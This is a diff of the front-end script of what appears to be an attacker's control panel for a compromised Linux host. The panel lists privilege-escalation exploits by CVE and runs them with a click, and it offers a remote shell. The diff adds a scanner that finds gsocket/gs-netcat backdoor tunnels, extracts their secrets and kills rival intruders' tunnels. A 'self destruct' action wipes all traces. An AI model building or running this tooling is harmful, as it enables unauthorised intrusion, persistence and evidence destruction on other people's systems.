+const copy=el=>{navigator.clipboard.writeText(el.innerText);el.style.borderColor='var(--green)';setTimeout(()=>el.style.borderColor='',500);};
 document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));
-let cwd='/',liveTimer;
+let cwd='/';
 
-function nav(p){
-document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));
-document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));
-$('p-'+p)?.classList.add('on');
-document.querySelector(`.nav-item[data-p="${p}"]`)?.classList.add('on');
-if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();
-}
+function nav(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));$('p-'+p)?.classList.add('on');document.querySelector(`.nav-item[data-p="${p}"]`)?.classList.add('on');if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();if(p==='gs')scanGS();}
 
 async function init(){
 const s=await api('run',{path:'scripts/sysinfo.sh'});
-try{const d=JSON.parse(s.output||'{}');
-$('s_kernel').textContent=d.kernel||'-';
-$('s_user').textContent=d.user||'-';
-$('s_uid').textContent='UID: '+(d.uid||'-');
-$('s_uptime').textContent=d.uptime||'-';
-$('s_mem').textContent=d.mem||'-';
-}catch(e){$('s_kernel').textContent='Error';}
+try{const d=JSON.parse(s.output||'{}');$('s_kernel').textContent=d.kernel||'-';$('s_user').textContent=d.user||'-';$('s_uid').textContent='uid:'+(d.uid||'-');$('s_uptime').textContent=d.uptime||'-';$('s_mem').textContent=d.mem||'-';}catch(e){}
 scanInit();ls(cwd);startLive();
 }
 
 function startLive(){
 async function update(){
-const r=await api('exec',{cmd:"echo $(grep 'cpu ' /proc/stat|awk '{u=$2+$4;t=$2+$4+$5;print int(u*100/t)}') $(free|awk '/Mem:/{print int($3*100/$2)}') $(df /|tail -1|awk '{print $5}'|tr -d '%')"});
-const[cpu,mem,disk]=(r.output||'0 0 0').trim().split(' ');
+const r=await api('exec',{cmd:"echo $(grep 'cpu ' /proc/stat|awk '{u=$2+$4;t=$2+$4+$5;if(t>0)print int(u*100/t);else print 0}') $(free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}') $(df / 2>/dev/null|tail -1|awk '{print $5}'|tr -d '%') $(cat /proc/loadavg 2>/dev/null|awk '{print $1}')"});
+const p=(r.output||'0 0 0 0').trim().split(' ');
+const[cpu,mem,disk,load]=[p[0]||0,p[1]||0,p[2]||0,p[3]||'0'];
 $('live').innerHTML=`
 <div class="live-stat"><div class="live-stat-label">CPU</div><div class="live-stat-value">${cpu}%</div><div class="live-stat-bar"><i style="width:${cpu}%;background:${cpu>80?'var(--red)':cpu>50?'var(--gold)':'var(--green)'}"></i></div></div>
-<div class="live-stat"><div class="live-stat-label">Memory</div><div class="live-stat-value">${mem}%</div><div class="live-stat-bar"><i style="width:${mem}%;background:${mem>80?'var(--red)':mem>50?'var(--gold)':'var(--green)'}"></i></div></div>
+<div class="live-stat"><div class="live-stat-label">RAM</div><div class="live-stat-value">${mem}%</div><div class="live-stat-bar"><i style="width:${mem}%;background:${mem>80?'var(--red)':mem>50?'var(--gold)':'var(--green)'}"></i></div></div>
 <div class="live-stat"><div class="live-stat-label">Disk</div><div class="live-stat-value">${disk}%</div><div class="live-stat-bar"><i style="width:${disk}%;background:${disk>80?'var(--red)':disk>50?'var(--gold)':'var(--green)'}"></i></div></div>
-<div class="live-stat"><div class="live-stat-label">Load</div><div class="live-stat-value" id="loadavg">-</div></div>`;
-const r2=await api('exec',{cmd:"cat /proc/loadavg|awk '{print $1}'"});
-if($('loadavg'))$('loadavg').textContent=r2.output?.trim()||'-';
-}
-update();liveTimer=setInterval(update,3000);
+<div class="live-stat"><div class="live-stat-label">Load</div><div class="live-stat-value">${load}</div></div>`;}
+update();setInterval(update,3000);
 }
 
 async function scanInit(){
-$('scan').innerHTML=`<div class="progress"><i id="sprog" style="width:0%"></i></div><div id="slog" style="max-height:120px;overflow-y:auto;margin-top:8px"></div>`;
-const steps=['Analyzing kernel version...','Scanning SUID binaries...','Checking capabilities...','Reviewing permissions...','Finalizing results...'];
-for(let i=0;i<steps.length;i++){log('slog',steps[i],'info');$('sprog').style.width=((i+1)/steps.length*100)+'%';await new Promise(r=>setTimeout(r,150));}
+$('scan').innerHTML=`<div class="progress"><i id="sprog" style="width:0%"></i></div><div id="slog" style="max-height:100px;overflow-y:auto;margin-top:6px"></div>`;
+const steps=['Analyzing kernel...','Scanning SUID...','Checking caps...','Done'];
+for(let i=0;i<steps.length;i++){log('slog',steps[i],'info');$('sprog').style.width=((i+1)/steps.length*100)+'%';await new Promise(r=>setTimeout(r,120));}
 const r=await api('run',{path:'exploits/gate.sh'});
 try{const d=JSON.parse(r.output||'{}');
-if(d.exploits?.length){for(const x of d.exploits)log('slog',`✓ ${x.cve} - ${x.name} [${x.rate}%]`,'ok');
-let h='<div style="margin-top:16px">';
-for(const x of d.exploits.slice(0,4)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';
-h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
-$('scan').innerHTML+='</div>'+h;}else log('slog','No exploits found','info');
-}catch(e){log('slog',r.output||'Error','err');}}
+if(d.exploits?.length){for(const x of d.exploits)log('slog',`✓ ${x.cve} [${x.rate}%]`,'ok');
+let h='<div style="margin-top:12px">';for(const x of d.exploits.slice(0,3)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
+$('scan').innerHTML+='</div>'+h;}else log('slog','No vulns','info');}catch(e){log('slog','Error','err');}}
 
 async function scan(){
-$('expl').innerHTML='<div style="color:var(--text2);padding:20px;text-align:center">Scanning...</div>';
+$('expl').innerHTML='<div style="padding:20px;color:var(--text2);text-align:center">Scanning...</div>';
 const r=await api('run',{path:'exploits/gate.sh'});
-try{const d=JSON.parse(r.output||'{}');
-if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';
-h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
-$('expl').innerHTML=h;}else $('expl').innerHTML='<div style="color:var(--text2);padding:20px;text-align:center">No exploits available</div>';}
-catch(e){$('expl').innerHTML=`<div style="color:var(--red);padding:20px">${r.output}</div>`;}}
+try{const d=JSON.parse(r.output||'{}');if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}$('expl').innerHTML=h;}else $('expl').innerHTML='<div style="padding:20px;color:var(--text2);text-align:center">No exploits</div>';}catch(e){$('expl').innerHTML=`<div style="color:var(--red);padding:20px">${r.output}</div>`;}}
 
-async function runE(cve){if(!confirm('Execute '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
+async function runE(cve){if(!confirm('Run '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
 async function rs(p){if(!p)return;clear('so');log('so','$ '+p,'cmd');const r=await api('run',{path:p});(r.output||'').split('\n').forEach(l=>log('so',l,'ok'));}
 async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,l.toLowerCase().includes('error')||l.toLowerCase().includes('denied')?'err':'ok'));}
 async function rc2(c){clear('to');log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,'ok'));nav('term');}
-async function loadProc(){clear('po');log('po','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem 2>/dev/null|head -40'});(r.output||'').split('\n').forEach((l,i)=>log('po',l,i===0?'info':''));}
-async function loadNet(){clear('no');log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null||netstat -tulpn 2>/dev/null'});(r.output||'').split('\n').forEach((l,i)=>log('no',l,i===0?'info':''));log('no','','');log('no','$ ip addr','cmd');const r2=await api('exec',{cmd:"ip addr 2>/dev/null|grep -E 'inet |link/ether'"});(r2.output||'').split('\n').forEach(l=>log('no',l,'info'));}
+async function loadProc(){clear('po');log('po','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem 2>/dev/null|head -35'});(r.output||'').split('\n').forEach((l,i)=>log('po',l,i===0?'info':''));}
+async function loadNet(){clear('no');log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null||netstat -tulpn 2>/dev/null|head -30'});(r.output||'').split('\n').forEach((l,i)=>log('no',l,i===0?'info':''));log('no','');log('no','$ ip addr','cmd');const r2=await api('exec',{cmd:"ip addr 2>/dev/null|grep -E 'inet |link/ether'"});(r2.output||'').split('\n').forEach(l=>log('no',l,'info'));}
+
+async function scanGS(){
+$('gslist').innerHTML='<div style="color:var(--text2);padding:10px">Scanning for gsocket processes...</div>';
+const r=await api('exec',{cmd:`
+ps aux 2>/dev/null | grep -E 'gs-netcat|gsocket' | grep -v grep | while read line; do
+  pid=$(echo "$line" | awk '{print $2}')
+  user=$(echo "$line" | awk '{print $1}')
+  cmd=$(echo "$line" | awk '{for(i=11;i<=NF;i++)printf $i" "}')
+  secret=$(echo "$cmd" | grep -oP '(?<=-s )\\S+' | head -1)
+  start=$(ps -o lstart= -p $pid 2>/dev/null | xargs)
+  [ -z "$secret" ] && secret="(hidden)"
+  echo "$pid|$user|$secret|$start|$cmd"
+done
+`});
+const lines=(r.output||'').trim().split('\n').filter(l=>l.includes('|'));
+if(lines.length===0){$('gslist').innerHTML='<div style="color:var(--text2);padding:10px;text-align:center">No other gsockets found</div>';return;}
+const mygs=$('mygs').innerText;
+let h='';
+for(const line of lines){
+const[pid,user,secret,start,cmd]=line.split('|');
+const isMine=secret===mygs;
+h+=`<div class="gs-item ${isMine?'mine':''}">
+<div class="gs-info">
+<div class="gs-secret">${secret}</div>
+<div class="gs-meta"><span>👤 ${user}</span><span>PID: ${pid}</span><span>📅 ${start||'?'}</span></div>
+</div>
+<div class="gs-actions">
+${isMine?'<span style="color:var(--green);font-size:9px">YOURS</span>':`<button class="btn btn-sm btn-red" onclick="killGS(${pid})">KILL</button>`}
+</div>
+</div>`;
+}
+$('gslist').innerHTML=h;
+}
+
+async function killGS(pid){
+if(!confirm('Kill gsocket process '+pid+'?'))return;
+await api('exec',{cmd:'kill -9 '+pid});
+scanGS();
+}
 
 async function ls(p){
 cwd=p;
@@ -288,25 +318,23 @@ const d=await api('files',{path:p});
 let h='';
 if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" onclick="ls('${pr}')"><div class="fm-icon dir">↑</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;}
 const files=(d.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name));
-for(const f of files){const np=p==='/'?'/'+f.name:p+'/'+f.name;const isDir=f.type==='dir';
-const ext=f.name.split('.').pop().toLowerCase();
-const icons={sh:'⚡',py:'🐍',js:'📜',json:'{}',txt:'📝',log:'📋',conf:'⚙',c:'©',h:'©',html:'🌐',css:'🎨',md:'📑'};
+for(const f of files){const np=p==='/'?'/'+f.name:p+'/'+f.name;const isDir=f.type==='dir';const ext=f.name.split('.').pop().toLowerCase();
+const icons={sh:'⚡',py:'🐍',js:'📜',json:'{}',txt:'📝',log:'📋',conf:'⚙',c:'©'};
 h+=`<div class="fm-item" onclick="${isDir?`ls('${np}')`:`preview('${np}')`}"><div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} ${f.size||''}</div></div></div>`;}
-$('fls').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--text2)">Empty directory</div>';
+$('fls').innerHTML=h||'<div style="padding:16px;text-align:center;color:var(--text2)">Empty</div>';
 $('fpreview').innerHTML='';
 }
 
 async function preview(p){
 const r=await api('read',{path:p});
 const ext=p.split('.').pop().toLowerCase();
-const textExt=['sh','txt','log','conf','py','js','json','html','css','c','h','md','xml','yml','yaml','ini','env','cfg'];
-if(r.content&&textExt.includes(ext)){
-$('fpreview').innerHTML=`<div class="fm-preview">${r.content.replace(/</g,'&lt;').substring(0,3000)}</div>`;
-}else{$('fpreview').innerHTML=`<div class="fm-preview" style="color:var(--text3)">${p.split('/').pop()}\n\nBinary or unsupported</div>`;}
+const textExt=['sh','txt','log','conf','py','js','json','html','css','c','h','md','xml','yml'];
+if(r.content&&textExt.includes(ext))$('fpreview').innerHTML=`<div class="fm-preview">${r.content.replace(/</g,'&lt;').substring(0,2000)}</div>`;
+else $('fpreview').innerHTML=`<div class="fm-preview" style="color:var(--text3)">Binary file</div>`;
 }
 
-async function pull(){const r=await api('pull');alert('Repository updated');location.reload();}
-async function nuke(){if(!confirm('⚠ SELF DESTRUCT?\n\nThis will remove all traces.'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-family:JetBrains Mono;font-size:24px;letter-spacing:4px">DESTROYED</div>';}
+async function pull(){await api('pull');alert('Updated');location.reload();}
+async function nuke(){if(!confirm('⚠ DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-family:JetBrains Mono;font-size:20px">DESTROYED</div>';}
 
 init();
 </script>
